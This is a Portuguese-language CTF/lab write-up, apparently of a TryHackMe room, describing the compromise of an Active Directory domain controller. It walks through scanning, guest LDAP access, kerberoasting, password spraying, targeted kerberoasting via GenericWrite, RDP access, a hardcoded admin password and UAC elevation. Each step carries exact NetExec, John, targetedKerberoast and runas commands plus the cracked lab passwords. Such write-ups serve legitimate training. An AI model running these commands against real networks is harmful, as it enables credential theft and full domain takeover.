
## Parte 1: Reconhecimento e Descoberta (Nmap)

**A Estratégia (Por que foi feito):** Em cibersegurança, você não pode atacar o que não consegue ver. O objetivo inicial não era apenas encontrar portas abertas, mas identificar a "identidade" do servidor. Ao ver portas como 88 (Kerberos), 389 (LDAP) e 53 (DNS) abertas simultaneamente, identifiquei imediatamente que o alvo (`10.48.155.220`) era um **Domain Controller (DC)** rodando Windows Server 2019. Isso definiu todo o arsenal que seria usado a seguir.

**A Execução (Como foi feito):**

Para mapear o servidor, usei o Nmap varrendo todas as 65.535 portas, sem ping (para contornar firewalls) e executando scripts de enumeração de serviço.

Bash

```
nmap -T4 -n -sC -sV -Pn -p- 10.48.155.220
```

Após descobrir o domínio base, mapeei o alvo no arquivo `/etc/hosts` da máquina atacante para que as ferramentas de rede funcionassem corretamente:

Plaintext

```
10.48.155.220 ad.thm.local thm.local
```

## Parte 2: Buscando a "Porta Destrancada" (Acesso Guest)

**A Estratégia (Por que foi feito):** Muitas redes falham no básico, deixando o acesso anônimo ou a conta de convidado (`guest`) ativada. O serviço LDAP funciona como o "catálogo telefônico" do Active Directory (AD). Se eu conseguisse ler o LDAP sem uma senha real, teria uma visão interna da estrutura da empresa, seus usuários e grupos, colocando o "pé na porta" da rede.

**A Execução (Como foi feito):**

Usei o NetExec (nxc) para testar a conta `guest` com senha em branco, primeiro no compartilhamento de arquivos (SMB) e depois na consulta de diretório (LDAP).

Bash

```
nxc smb ad.thm.local -u 'guest' -p '' --shares
```

Bash

```
nxc ldap ad.thm.local -u 'guest' -p ''
```

_A autenticação LDAP funcionou, me dando permissão de leitura no diretório._

## Parte 3: O Primeiro Ataque (Kerberoasting)

**A Estratégia (Por que foi feito):** O Kerberoasting é um ataque silencioso e fatal. Contas de serviço no AD possuem um identificador chamado SPN (_Service Principal Name_). Qualquer usuário, até mesmo um `guest`, pode pedir ao servidor um ticket de acesso (TGS) para essas contas. A falha de design é que **esse ticket vem criptografado com o hash da senha da conta**. A tática é: pedir o ticket, salvá-lo no meu computador e tentar quebrar a senha por força bruta offline, sem gerar alertas no servidor.

**A Execução (Como foi feito):**

Solicitei os tickets Kerberos via LDAP e os salvei em um arquivo. O sistema me entregou o hash do usuário `CODY_ROY`.

Bash

```
nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

Em seguida, usei o John the Ripper e a wordlist `rockyou.txt` para quebrar o hash na minha própria máquina.

Bash

```
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

_(Senha descoberta: `MKO)mko0`)_

## Parte 4: Expansão de Acesso (Password Spraying)

**A Estratégia (Por que foi feito):** Eu tinha a senha do Cody, mas queria mais privilégios. Fazer força bruta tradicional (testar mil senhas em uma conta) bloquearia o usuário. O _Password Spraying_ faz o oposto: testa **uma única senha** em centenas de usuários. Como as pessoas tendem a reciclar senhas em ambientes corporativos, a chance de alguém usar a mesma senha do Cody era alta.

**A Execução (Como foi feito):**

Primeiro, extraímos a lista completa de usuários do domínio:

Bash

```
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | grep "LDAP" | awk '{print $5}' > users.txt
```

Com a lista pronta (`users.txt`), disparei o ataque via SMB contra todo o domínio, instruindo a ferramenta a não parar no primeiro acerto (`--continue-on-success`):

Bash

```
nxc smb ad.thm.local -u users.txt -p 'MKO)mko0' --continue-on-success
```

_(Sucesso: Descobri que o usuário `ZACHARY_HUNT` usava a mesma senha)_.

## Parte 5: Escalada de Privilégios (Targeted Kerberoasting)

**A Estratégia (Por que foi feito):** Ao mapear a rede visualmente com o BloodHound, descobri que Zachary tinha permissão de `GenericWrite` (Escrita Genérica) sobre o perfil da usuária `JERRI_LANCASTER`. Jerri não era uma conta de serviço, logo, não era vulnerável ao Kerberoasting normal. Porém, com minha permissão de escrita, **injetei um SPN falso no perfil dela**, transformando-a temporariamente em um alvo válido para roubar seu ticket Kerberos.

**A Execução (Como foi feito):**

Usei um script Python específico que faz todo o processo automaticamente: loga como Zachary, adiciona o SPN em Jerri, baixa o hash, e depois remove o SPN para apagar os rastros.

Bash

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

Com o hash da Jerri em mãos, voltei ao John the Ripper:

Bash

```
john jerry --wordlist=/usr/share/wordlists/rockyou.txt
```

_(Senha descoberta: `lovinlife!`)_

## Parte 6: Acesso Visual e Pós-Exploração (RDP e Scripts)

**A Estratégia (Por que foi feito):** O BloodHound também me disse que Jerri pertencia ao grupo `Remote Desktop Users`. Ter uma interface gráfica facilita imensamente a exploração local de um servidor. Administradores de rede frequentemente criam scripts de automação e cometem o erro crítico de deixar senhas escritas diretamente no código (_hardcoded_).

**A Execução (Como foi feito):**

Abri uma sessão gráfica no Domain Controller usando o protocolo RDP via `xfreerdp3`:

Bash

```
xfreerdp3 /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore
```

Explorando a máquina, acessei a pasta `C:\Scripts`, abri o arquivo `syncer.ps1` e encontrei as credenciais de um administrador dentro do código.

_(Senha descoberta do Sanford: `RESET_ASAP123`)_

## Parte 7: O Cheque-Mate (Bypass de UAC e Elevação de PowerShell)

**A Estratégia (Por que foi feito):** Em vez de desconectar a Jerri e fazer um novo login RDP, tentei acessar a conta do Sanford pelo próprio terminal (CMD). No entanto, o Windows possui o **UAC (User Account Control)**. Mesmo Sanford sendo administrador, seu CMD padrão roda com privilégios limitados, o que bloqueou meu acesso à pasta `C:\Users\Administrator`. Eu precisava "forçar" o Windows a me dar um terminal com o Token de Administrador verdadeiro.

**A Execução (Como foi feito):**

A partir da área de trabalho da Jerri, abri um terminal autenticado como Sanford:

DOS

```
runas /user:thm.local\sanford_daugherty cmd.exe
```

Ao tentar entrar na pasta do Administrador, recebi _Acesso Negado_. Então, de dentro desse terminal, disparei um comando PowerShell para abrir um novo processo como Administrador:

DOS

```
powershell -Command "Start-Process powershell -Verb RunAs"
```

Isso fez o prompt do UAC aparecer na tela gráfica da Jerri. Como eu tinha a senha do Sanford, confirmei a ação. Uma nova janela do PowerShell se abriu, desta vez com controle total (Administrator), me permitindo acessar a pasta final e comprometer 100% o Domain Controller.